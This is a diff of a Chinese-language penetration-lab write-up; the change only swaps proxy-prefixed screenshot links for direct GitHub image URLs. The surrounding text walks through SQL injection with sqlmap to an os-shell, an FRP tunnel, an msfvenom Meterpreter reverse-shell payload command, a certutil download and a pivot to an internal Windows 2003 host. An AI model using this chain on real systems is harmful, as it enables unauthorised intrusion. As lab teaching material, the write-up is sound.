@@ -22,7 +22,7 @@ __
 
   
 
-**eve模拟真实环境的靶场渗透**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143244.png)  
+**eve模拟真实环境的靶场渗透**![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143244.png)  
 
   
 
@@ -30,7 +30,7 @@ __
 
  ** _ **1**_** **拓扑图：**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143248.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143248.png)
 
 本实验模拟公网，左边kali通过sqlmap攻击右边Server_5并且os-
 shell，再通过反弹shell在MSF当中建立会话，再以Server_5为跳板机攻击内网当中另外一台没有映射服务的Win2003。
@@ -137,13 +137,13 @@ R5(config)#inte0/0
 
 左边kali（通过dhclient获取地址）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143249.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143249.png)
 
   
 
 访问Server_5，这里做一个DNS解析（本来一开始搭建了一台公网DNS服务器模拟公网映射的，但是运行环境真的顶不住了，所以就删掉了那台设备，直接修改本地hosts文件了）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143251.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143251.png)
 
 将域名解析到23.0.0.3上面
 
@@ -153,7 +153,7 @@ R5(config)#inte0/0
 
 访问一下web
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143252.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143252.png)
 
 OK！暂时莫得问题！！！
 
@@ -163,7 +163,7 @@ OK！暂时莫得问题！！！
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143253.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143253.png)
 
   
 
@@ -175,13 +175,13 @@ OK！暂时莫得问题！！！
 
 装好frp
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143254.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143254.png)
 
   
 
 开启FRP，等待侦听
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143255.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143255.png)
 
   
 
@@ -190,7 +190,7 @@ OK！暂时莫得问题！！！
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=202.100.1.3 LPORT=6000 -fexe
 > reverse.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143256.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143256.png)
 
 上面的LPORT=6000记得要和你frp客户端（也就是紫色的kali）配置文件当中的remote_port要一样喔
 
@@ -206,13 +206,13 @@ OK!!!!至此，中间的FRP服务器已经配置好了（当然，上述的操�
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143257.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143257.png)
 
   
 
  **1.首先先连接上 frp**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143258.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143258.png)
 
   
 
@@ -222,7 +222,7 @@ OK!!!!至此，中间的FRP服务器已经配置好了（当然，上述的操�
 
 此时你会看到远程的frp_server当中有连接提示
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143259.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143259.png)
 
   
 
@@ -240,7 +240,7 @@ OK!!!!至此，中间的FRP服务器已经配置好了（当然，上述的操�
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143300.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143300.png)
 
   
 
@@ -250,7 +250,7 @@ OK!!!!至此，中间的FRP服务器已经配置好了（当然，上述的操�
 
 那么，我们可以使用certutil.exe，一般看到成功完成就代表下载下来了，所以我就不dir来查看了
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143301.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143301.png)
 
   
 
@@ -264,13 +264,13 @@ OK!!!!至此，中间的FRP服务器已经配置好了（当然，上述的操�
 
 接下来在sqlmap的os-shell当中运行reverse.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143302.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143302.png)
 
   
 
 MSF当中出现会话
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143303.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143303.png)
 
   
 
@@ -284,7 +284,7 @@ MSF当中出现会话
 
 那么先进来shell当中看看，这里我是想直接扫描内网存活主机的，但是很容易就卡死了，所以我就直接shell到Server_5当中看arp表了
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143304.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143304.png)
 
   
 
@@ -294,21 +294,21 @@ MSF当中出现会话
 
 先把payload改为
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143305.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143305.png)
 
 然后
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143306.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143306.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143307.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143307.png)
 
   
 
 查看会话表：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143308.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210809143308.png)
 
   
 
